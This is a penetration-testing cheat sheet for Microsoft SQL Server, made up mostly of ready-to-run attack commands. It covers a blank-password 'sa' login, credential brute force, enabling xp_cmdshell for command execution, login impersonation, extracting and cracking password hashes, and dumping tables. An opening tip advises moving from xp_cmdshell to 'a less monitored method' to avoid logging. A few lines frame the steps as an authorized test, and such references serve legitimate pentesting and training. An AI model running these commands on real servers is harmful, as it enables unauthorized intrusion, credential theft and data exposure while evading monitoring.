# MSSQL (1433)

!!! tip "Start here"
    Try SA with a blank password first: `impacket-mssqlclient sa:@$IP`. If you get in, run `xp_cmdshell 'whoami'`, it's often already enabled on unmanaged instances. If not, enable it with `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE`.

!!! warning "Watch out"
    `xp_cmdshell` execution is logged. Use it to establish a shell quickly, then move to a less monitored method.

---

## Enumeration

```bash
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info $IP
```

---

## Authentication

```bash
impacket-mssqlclient sa:@$IP
impacket-mssqlclient -windows-auth "$NETBIOS/$USERNAME:$PASSWORD@$IP"
```

---

## Brute Force

```bash
nxc mssql $IP -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt mssql://$IP
```

---

## xp_cmdshell RCE

Enable if disabled:
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Enabling `xp_cmdshell` requires `sysadmin`, changes server configuration, and is logged. Record whether it was already enabled; if the test enabled it, restore the original state afterward.

Execute commands:
```sql
EXEC xp_cmdshell 'whoami';
```

Disable it after validation only when it was disabled before the test:
```sql
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

---

## User Impersonation

Check who can be impersonated with the current login:
```sql
SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

Switch to that login:
```sql
EXECUTE AS LOGIN = 'sa';
```

---

## Credential Extraction

```sql
SELECT name, password_hash FROM sys.sql_logins;
```

```bash
hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt
```

Mode `1731` applies to SQL Server 2012–2022 verifier version `0x02`. Older SQL Server hashes use different modes, and SQL Server 2025 introduces verifier version `0x03`; identify the hash format before cracking.

---

## Quick SQL Reference

```sql
SELECT name FROM master..sysdatabases;                              -- list databases
USE database_name; SELECT name FROM sysobjects WHERE xtype='U';    -- list tables
SELECT * FROM table_name;                                           -- dump table
SELECT name, data_source, is_linked FROM sys.servers;               -- linked servers
```
